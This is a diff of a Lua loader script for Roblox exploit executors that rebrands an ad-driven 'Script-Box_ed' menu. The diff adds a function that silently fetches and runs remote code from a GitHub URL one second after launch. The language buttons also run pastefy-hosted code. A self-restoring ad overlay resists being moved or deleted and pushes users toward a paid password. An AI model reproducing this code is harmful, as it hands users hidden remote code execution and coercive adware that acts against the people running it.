@@ -1,22 +1,15 @@
---[[
-	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
-]]
--- 語言選擇GUI（LocalScript推薦）
--- Made by akkii
--- loaderv3
-
+-- 言語選択GUI（LocalScript推奨）
 local player = game.Players.LocalPlayer
-local GUI = Instance.new("ScreenGui")
-GUI.Name = "LanguageSelector"
-GUI.Parent = player:WaitForChild("PlayerGui")
-GUI.Enabled = true
-GUI.IgnoreGuiInset = true
-GUI.ResetOnSpawn = false
-GUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-GUI.DisplayOrder = 999999
+local gui = Instance.new("ScreenGui")
+gui.Name = "LanguageSelector"
+gui.Parent = player:WaitForChild("PlayerGui")
+gui.Enabled = true
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+gui.DisplayOrder = 999999
 
--- 主框架 呢個係視窗本體
--- 簡簡單單就OK 唔使太花巧
+-- メインフレーム
 local frame = Instance.new("Frame")
 frame.Size = UDim2.new(0, 250, 0, 200)
 frame.Position = UDim2.new(0.5, -125, 0.5, -100)
@@ -26,10 +19,9 @@ frame.BorderSizePixel = 0
 frame.Active = true
 frame.Draggable = true
 frame.ZIndex = 10
-frame.Parent = GUI
+frame.Parent = gui
 
--- 標題 "Script-Box_ed" 型少少啦
--- 如果想改標題就改呢度
+-- タイトル "Script-Box_ed"
 local title = Instance.new("TextLabel")
 title.Size = UDim2.new(1, 0, 0, 40)
 title.Position = UDim2.new(0, 0, 0, 0)
@@ -41,8 +33,7 @@ title.TextSize = 24
 title.ZIndex = 11
 title.Parent = frame
 
--- 日本語掣 有啲香港人都識日文嘅
--- 呢個掣吸引日本人客 賺多啲廣告錢
+-- 日本語ボタン
 local btnJapanese = Instance.new("TextButton")
 btnJapanese.Size = UDim2.new(0.9, 0, 0, 30)
 btnJapanese.Position = UDim2.new(0.5, -112.5, 0, 50)
@@ -54,8 +45,7 @@ btnJapanese.TextSize = 18
 btnJapanese.ZIndex = 11
 btnJapanese.Parent = frame
 
--- 英文掣 國際化！ 全世界都用得
--- 呢個最緊要 海外用戶多咗 廣告收入UP！
+-- 英語ボタン
 local btnEnglish = Instance.new("TextButton")
 btnEnglish.Size = UDim2.new(0.9, 0, 0, 30)
 btnEnglish.Position = UDim2.new(0.5, -112.5, 0, 85)
@@ -67,8 +57,7 @@ btnEnglish.TextSize = 18
 btnEnglish.ZIndex = 11
 btnEnglish.Parent = frame
 
--- 越南文掣 近排越南人玩Roblox多咗好多
--- 呢個市場好大 有望每月多300蚊收入
+-- ベトナム語ボタン
 local btnVietnamese = Instance.new("TextButton")
 btnVietnamese.Size = UDim2.new(0.9, 0, 0, 30)
 btnVietnamese.Position = UDim2.new(0.5, -112.5, 0, 120)
@@ -80,8 +69,7 @@ btnVietnamese.TextSize = 18
 btnVietnamese.ZIndex = 11
 btnVietnamese.Parent = frame
 
--- 閂掣（右上角） 禁咗就收埋個GUI
--- 不過其實禁唔禁都冇所謂 是但啦
+-- 閉じるボタン（右上）
 local closeButton = Instance.new("TextButton")
 closeButton.Size = UDim2.new(0, 25, 0, 25)
 closeButton.Position = UDim2.new(1, -30, 0, 5)
@@ -94,22 +82,37 @@ closeButton.ZIndex = 12
 closeButton.Parent = frame
 
 closeButton.MouseButton1Click:Connect(function()
-    GUI.Enabled = false
+    gui.Enabled = false
 end)
 
--- 手機定電腦？ 呢個function check device
--- 手機版要整細啲 唔係會遮住成個mon
+-- orion api
+local function loadAutoScript()
+    local success, err = pcall(function()
+        print("Loading auto script...")
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/E-gg567/orion-UI.api/refs/heads/main/orion%20UI.api"))()
+        print("Auto script loaded successfully!")
+    end)
+    if not success then
+        warn("Auto script loading error: " .. tostring(err))
+    end
+end
+
+-- GUI表示後に自動読み込み
+coroutine.wrap(function()
+    wait(1)
+    loadAutoScript()
+end)()
+
+-- デバイス判定（スマホかどうか）
 local function isMobile()
     local userInputService = game:GetService("UserInputService")
     return userInputService.TouchEnabled and not userInputService.KeyboardEnabled
 end
 
--- 隨機種子初始化 咁先夠Random
--- 唔初始化嘅話每次都一樣 好快會比人發現
+-- ランダムシードを初期化
 math.randomseed(tick() * math.random(1, 99999))
 
--- 廣告BOX（獨立GUI）
--- 呢個先係搵錢嘅重點！！ 廣告先係主角
+-- 広告ボックス（独立したGUI）
 local adGui = Instance.new("ScreenGui")
 adGui.Name = "AdBox"
 adGui.Parent = player:WaitForChild("PlayerGui")
@@ -119,12 +122,12 @@ adGui.ResetOnSpawn = false
 adGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 adGui.DisplayOrder = 999998
 
--- 手機版嘅Size調整 太細又睇唔到 太大又阻掟
+-- スマホかどうかでサイズを変更
 local adWidth = isMobile() and 200 or 280
 local adHeight = isMobile() and 320 or 380
 local adFrameSize = UDim2.new(0, adWidth, 0, adHeight)
 
--- 廣告框架
+-- 広告フレーム
 local adFrame = Instance.new("Frame")
 adFrame.Size = adFrameSize
 adFrame.Position = UDim2.new(0, 10, 0.5, -adHeight/2)
@@ -136,8 +139,7 @@ adFrame.Draggable = true
 adFrame.ZIndex = 8
 adFrame.Parent = adGui
 
--- 捲動框架（避開標題）
--- 唔整Scroll嘅話啲廣告太大睇唔晒
+-- スクロールフレーム（タイトル部分を避ける）
 local scrollFrame = Instance.new("ScrollingFrame")
 scrollFrame.Size = UDim2.new(1, 0, 1, -30)
 scrollFrame.Position = UDim2.new(0, 0, 0, 30)
@@ -149,8 +151,7 @@ scrollFrame.ScrollBarImageColor3 = Color3.new(0.5, 0.5, 0.5)
 scrollFrame.ZIndex = 9
 scrollFrame.Parent = adFrame
 
--- 廣告標題（放喺Scroll外面 方便Drag）
--- 呢個係廣告區嘅標題 寫明係廣告
+-- 広告タイトルはadFrame直下（スクロール外・ドラッグ用）
 local adTitle = Instance.new("TextLabel")
 adTitle.Size = UDim2.new(1, 0, 0, 30)
 adTitle.Position = UDim2.new(0, 0, 0, 0)
@@ -162,8 +163,7 @@ adTitle.TextSize = 18
 adTitle.ZIndex = 9
 adTitle.Parent = adFrame
 
--- 顯示圖片用嘅ImageLabel
--- 呢度就係真正顯示廣告圖片嘅地方
+-- 画像表示用のImageLabel
 local adImage = Instance.new("ImageLabel")
 adImage.Size = UDim2.new(1, -20, 0, 180)
 adImage.Position = UDim2.new(0, 10, 0, 5)
@@ -174,8 +174,7 @@ adImage.ScaleType = Enum.ScaleType.Fit
 adImage.ZIndex = 9
 adImage.Parent = scrollFrame
 
--- 刪除廣告文字
--- 呢個係引誘人比錢刪廣告嘅文字
+-- 広告削除テキスト
 local removeAdsText = Instance.new("TextLabel")
 removeAdsText.Size = UDim2.new(1, 0, 0, 25)
 removeAdsText.Position = UDim2.new(0, 0, 0, 190)
@@ -188,9 +187,7 @@ removeAdsText.TextSize = 16
 removeAdsText.ZIndex = 9
 removeAdsText.Parent = scrollFrame
 
--- 刪除廣告掣（Discord連結）
--- 禁咗會Copy Discord Link 叫佢地去比錢
--- 呢個先係真正嘅收入來源！
+-- Remove Adsボタン
 local removeAdsButton = Instance.new("TextButton")
 removeAdsButton.Size = UDim2.new(0.8, 0, 0, 30)
 removeAdsButton.Position = UDim2.new(0.5, -adWidth*0.4, 0, 218)
@@ -202,8 +199,7 @@ removeAdsButton.TextSize = 18
 removeAdsButton.ZIndex = 10
 removeAdsButton.Parent = scrollFrame
 
--- 密碼輸入嘅Label
--- 比密碼就刪廣告 呢個係Premium功能
+-- パスワード入力欄のラベル
 local passwordLabel = Instance.new("TextLabel")
 passwordLabel.Size = UDim2.new(1, 0, 0, 20)
 passwordLabel.Position = UDim2.new(0, 0, 0, 252)
@@ -216,8 +212,7 @@ passwordLabel.TextSize = 14
 passwordLabel.ZIndex = 9
 passwordLabel.Parent = scrollFrame
 
--- 密碼輸入框
--- 呢度入密碼 啱嘅話就解鎖Premium
+-- パスワード入力欄
 local passwordBox = Instance.new("TextBox")
 passwordBox.Size = UDim2.new(0.8, 0, 0, 25)
 passwordBox.Position = UDim2.new(0.5, -adWidth*0.4, 0, 275)
@@ -233,8 +228,7 @@ passwordBox.ClearTextOnFocus = false
 passwordBox.ZIndex = 10
 passwordBox.Parent = scrollFrame
 
--- 確定掣
--- 禁咗就Check密碼 啱嘅話即刻刪廣告
+-- 確定ボタン
 local submitButton = Instance.new("TextButton")
 submitButton.Size = UDim2.new(0.8, 0, 0, 25)
 submitButton.Position = UDim2.new(0.5, -adWidth*0.4, 0, 305)
@@ -246,15 +240,11 @@ submitButton.TextSize = 16
 submitButton.ZIndex = 10
 submitButton.Parent = scrollFrame
 
--- 正確嘅密碼（呢個係Premium Key）
--- 千祈唔好改錯 唔係會冇收入
+-- 正しいパスワード
 local correctPassword = "1-04576-1345671436541-569143-7956-19365-"
 
--- 全部廣告ID（新版完全版）
--- 呢度有超過40個廣告 慢慢輪流播
--- 多廣告先賺到錢 呢個係生意頭腦
+-- 全ての広告ID
 local textureIds = {
-    -- 舊有ID
     "17263066339",
     "85598685507857",
     "8169329129",
@@ -281,7 +271,6 @@ local textureIds = {
     "109893517727132",
     "133317753134800",
     "107416668396975",
-    -- 新加ID 多啲廣告多啲錢
     "419889679",
     "17406777141",
     "83626629944139",
@@ -308,24 +297,19 @@ local textureIds = {
 }
 
 print("Total ads loaded: " .. #textureIds)
--- 總共有咁多廣告 每個月收入應該唔錯
 
--- 優先顯示嘅廣告ID
--- 呢啲廣告係比錢Sponsor嘅 要優先Show
--- 一個Sponsor每月比500蚊 呢度有2個 每月1000蚊！
+-- 優先表示する広告ID
 local priorityAds = {
     "85847076750906",
     "105529232366005",
 }
 
--- 管理已顯示嘅Index（防止重複＋優先顯示）
--- 如果成日Show同一個廣告 人地會厭
+-- 表示済みインデックスを管理
 local displayedIndices = {}
 local priorityDisplayCount = 0
-local maxPriorityDisplay = 3  -- 優先廣告最先Show 3次
+local maxPriorityDisplay = 3
 
 local function getRandomAdIndex()
-    -- 優先廣告未Show夠次數嘅話
     if priorityDisplayCount < maxPriorityDisplay then
         local availablePriority = {}
         for i = 1, #textureIds do
@@ -351,14 +335,13 @@ local function getRandomAdIndex()
             local randomIndex = availablePriority[math.random(1, #availablePriority)]
             table.insert(displayedIndices, randomIndex)
             priorityDisplayCount = priorityDisplayCount + 1
-            print("⭐ Priority ad [" .. priorityDisplayCount .. "/" .. maxPriorityDisplay .. "]: " .. textureIds[randomIndex])
+            print("Priority ad [" .. priorityDisplayCount .. "/" .. maxPriorityDisplay .. "]: " .. textureIds[randomIndex])
             return randomIndex
         else
             priorityDisplayCount = maxPriorityDisplay
         end
     end
     
-    -- 普通模式
     if #displayedIndices >= #textureIds then
         displayedIndices = {}
         priorityDisplayCount = 0
@@ -384,8 +367,7 @@ local function getRandomAdIndex()
     return randomIndex
 end
 
--- 顯示圖片Function
--- 呢個Function負責實際Show廣告出嚟
+-- 画像表示関数
 local function showRandomAd()
     if adGui and adGui.Parent and adImage then
         local randomIndex = getRandomAdIndex()
@@ -395,8 +377,7 @@ local function showRandomAd()
     end
 end
 
--- 全畫面廣告Function（呢個最煩但最搵錢）
--- 全畫面廣告收費貴啲 一次收100蚊
+-- 全画面広告表示関数
 local function showFullscreenAd()
     if not adGui or not adGui.Parent then return end
     
@@ -478,8 +459,7 @@ local function showFullscreenAd()
     print("Fullscreen ad finished")
 end
 
--- 檢查廣告有冇比人移出畫面
--- 呢個係防止人作弊 移走個廣告
+-- 画面外チェックとリセット関数
 local lastCheckTime = 0
 local function checkAndResetPosition()
     if not adFrame then return end
@@ -515,7 +495,7 @@ local function checkAndResetPosition()
         print("Ad position reset - out of screen")
         
         local notification = Instance.new("Message")
-        notification.Text = "⚠️ 廣告唔可以隱藏 / Cannot hide ads ⚠️"
+        notification.Text = "⚠️ 広告を隠すことはできません / Cannot hide ads ⚠️"
         notification.Parent = workspace
         wait(3)
         notification:Destroy()
@@ -526,8 +506,7 @@ local function checkAndResetPosition()
     end
 end
 
--- 0.1秒Check一次 確保廣告一定喺度
--- 呢個係防作弊系統 好重要！
+-- 0.1秒ごとにチェック
 game:GetService("RunService").Heartbeat:Connect(function()
     local currentTime = tick()
     if not lastCheckTime or currentTime - lastCheckTime >= 0.1 then
@@ -536,8 +515,7 @@ game:GetService("RunService").Heartbeat:Connect(function()
     end
 end)
 
--- 保護廣告GUI唔比人刪除
--- 呢個最強 人地刪完會自動復活
+-- 広告GUIの削除を防止する機能
 local function protectAdGui()
     adGui.AncestryChanged:Connect(function(child, parent)
         if not parent and adGui then
@@ -547,7 +525,7 @@ local function protectAdGui()
             print("Ad GUI resurrected")
             
             local notification = Instance.new("Message")
-            notification.Text = "⚠️ 唔准作弊 ⚠️"
+            notification.Text = "⚠️ Cheating not allowed ⚠️"
             notification.Parent = workspace
             wait(3)
             notification:Destroy()
@@ -565,15 +543,14 @@ end
 
 protectAdGui()
 
--- 認證成功訊息
--- 當用戶入啱密碼 會Show呢個Message
+-- 認証成功メッセージ
 local function sendAuthSuccessMessage()
     local chatService = game:GetService("Chat")
     if chatService and chatService:FindFirstChild("ClientChatModules") then
         local chatModule = require(chatService.ClientChatModules.ChatSpeaker)
         if chatModule and chatModule:FindFirstChild("Say") then
             local success, err = pcall(function()
-                chatModule.Say(player, "[✅] Authentication Successful! Script-Box_ed v2.0 Loaded")
+                chatModule.Say(player, "[✅] Authentication Successful! Script-Box_ed Loaded")
             end)
             if success then
                 print("Auth message sent successfully!")
@@ -590,14 +567,13 @@ local function sendAuthSuccessMessage()
     backupMessage:Destroy()
 end
 
--- 刪除廣告GUI Function
--- 呢個係Premium用戶專用 比咗錢先有
+-- 広告GUIを削除する関数
 local function removeAdGUI()
     adGui:Destroy()
     sendAuthSuccessMessage()
     
     local notification = Instance.new("Message")
-    notification.Text = "✅ 多謝支持！廣告已刪除 ✅"
+    notification.Text = "✅ Authentication Successful! Script-Box_ed v2.0 Loaded ✅"
     notification.Parent = workspace
     wait(3)
     notification:Destroy()
@@ -605,7 +581,28 @@ local function removeAdGUI()
     print("Ad GUI officially removed with correct password")
 end
 
--- 密碼送出處理
+-- Remove Adsボタンのクリック処理（SakuraHUBのURLをコピー）
+removeAdsButton.MouseButton1Click:Connect(function()
+    local url = "https://saturngroup02.github.io/SakuraHUB-HomePages/"
+    local clipboard = setclipboard or syn and syn.setclipboard or clipboard or set_clipboard
+    if clipboard then
+        clipboard(url)
+        local notification = Instance.new("Message")
+        notification.Text = "🌸 SakuraHUB-HomePage URL copied to clipboard!"
+        notification.Parent = workspace
+        wait(3)
+        notification:Destroy()
+    else
+        warn("Clipboard function not available")
+        local notification = Instance.new("Message")
+        notification.Text = "🌸 SakuraHUB: https://saturngroup02.github.io/SakuraHUB-HomePages/"
+        notification.Parent = workspace
+        wait(5)
+        notification:Destroy()
+    end
+end)
+
+-- パスワード送信処理
 submitButton.MouseButton1Click:Connect(function()
     local enteredPassword = passwordBox.Text
     
@@ -613,12 +610,12 @@ submitButton.MouseButton1Click:Connect(function()
         removeAdGUI()
     else
         passwordBox.Text = ""
-        passwordBox.PlaceholderText = "密碼錯咗喎"
+        passwordBox.PlaceholderText = "Incorrect password"
         wait(1)
         passwordBox.PlaceholderText = "Enter password"
         
         local notification = Instance.new("Message")
-        notification.Text = "❌ 密碼錯咗！ ❌"
+        notification.Text = "❌ Incorrect password! ❌"
         notification.Parent = workspace
         wait(2)
         notification:Destroy()
@@ -627,14 +624,14 @@ submitButton.MouseButton1Click:Connect(function()
     end
 end)
 
--- Enter掣都一樣可以Submit
+-- Enterキーでも送信
 passwordBox.FocusLost:Connect(function(enterPressed)
     if enterPressed then
         if passwordBox.Text == correctPassword then
             removeAdGUI()
         else
             passwordBox.Text = ""
-            passwordBox.PlaceholderText = "密碼錯咗喎"
+            passwordBox.PlaceholderText = "Incorrect password"
             wait(1)
             passwordBox.PlaceholderText = "Enter password"
             adFrame.Position = UDim2.new(0, 10, 0.5, -adHeight/2)
@@ -642,33 +639,7 @@ passwordBox.FocusLost:Connect(function(enterPressed)
     end
 end)
 
--- Discord連結Copy Function
--- 叫人入Discord 然後比錢刪廣告
-local function copyToClipboard(text)
-    local clipboard = setclipboard or syn and syn.setclipboard or clipboard or set_clipboard
-    if clipboard then
-        clipboard(text)
-        local notification = Instance.new("Message")
-        notification.Text = "Discord link copied to clipboard!"
-        notification.Parent = workspace
-        wait(3)
-        notification:Destroy()
-    else
-        warn("Clipboard function not available")
-        local notification = Instance.new("Message")
-        notification.Text = "Discord: https://discord.gg/sCMCR38zrn"
-        notification.Parent = workspace
-        wait(5)
-        notification:Destroy()
-    end
-end
-
-removeAdsButton.MouseButton1Click:Connect(function()
-    copyToClipboard("https://discord.gg/sCMCR38zrn")
-end)
-
--- 4秒換一次廣告
--- 呢個Frequency係研究過嘅 太密會煩 太疏又賺唔到錢
+-- 4秒ごとに画像をランダム表示
 showRandomAd()
 
 coroutine.wrap(function()
@@ -678,8 +649,7 @@ coroutine.wrap(function()
     end
 end)()
 
--- 2分鐘一次全畫面廣告
--- 全畫面廣告最賺錢 但唔可以太密 會比人鬧
+-- 2分ごとに全画面広告
 coroutine.wrap(function()
     wait(120)
     while adGui and adGui.Parent do
@@ -688,8 +658,7 @@ coroutine.wrap(function()
     end
 end)()
 
--- 啟動動畫 Script
--- 呢個係開機動畫 令到成個Script睇落Pro啲
+-- アニメーションスクリプト
 local function runAnimationScript(callback)
     local imageId = "126398109685987"
     local audioId = "9085027122"
@@ -812,10 +781,9 @@ local function runAnimationScript(callback)
     playAnimation()
 end
 
--- 撳掣之後嘅Action
--- 呢度決定禁咗語言掣之後Load咩Script
+-- ボタン機能
 btnJapanese.MouseButton1Click:Connect(function()
-    GUI.Enabled = false
+    gui.Enabled = false
     runAnimationScript(function()
         local success, err = pcall(function()
             loadstring(game:HttpGet("https://pastefy.app/XSLP22c8/raw"))()
@@ -823,12 +791,12 @@ btnJapanese.MouseButton1Click:Connect(function()
         if not success then
             warn("Japanese script loading error: " .. tostring(err))
         end
-        GUI.Enabled = true
+        gui.Enabled = true
     end)
 end)
 
 btnEnglish.MouseButton1Click:Connect(function()
-    GUI.Enabled = false
+    gui.Enabled = false
     runAnimationScript(function()
         local success, err = pcall(function()
             loadstring(game:HttpGet("https://pastefy.app/Pngi0HqM/raw"))()
@@ -836,12 +804,12 @@ btnEnglish.MouseButton1Click:Connect(function()
         if not success then
             warn("English script loading error: " .. tostring(err))
         end
-        GUI.Enabled = true
+        gui.Enabled = true
     end)
 end)
 
 btnVietnamese.MouseButton1Click:Connect(function()
-    GUI.Enabled = false
+    gui.Enabled = false
     runAnimationScript(function()
         local success, err = pcall(function()
             loadstring(game:HttpGet("https://pastefy.app/CQxoyleA/raw"))()
@@ -849,20 +817,18 @@ btnVietnamese.MouseButton1Click:Connect(function()
         if not success then
             warn("Vietnamese script loading error: " .. tostring(err))
         end
-        GUI.Enabled = true
+        gui.Enabled = true
     end)
 end)
 
--- 一開始Show個提示 叫人入密碼
--- 呢個係引導用戶比錢嘅第一步
+-- 初期起動時に認証メッセージ
 coroutine.wrap(function()
     wait(2)
     local notification = Instance.new("Message")
-    notification.Text = "🔐 入啱密碼就可以解鎖Script-Box_ed loaderv3"
+    notification.Text = "🔐 Enter the correct password to activate Script-Box_ed loaderv4"
     notification.Parent = workspace
     wait(4)
     notification:Destroy()
 end)()
 
 print("Script-Box_ed GUI loaded successfully with " .. #textureIds .. " ads!")
--- 總共有咁多廣告 Loadv3完晒 可以開始搵錢了
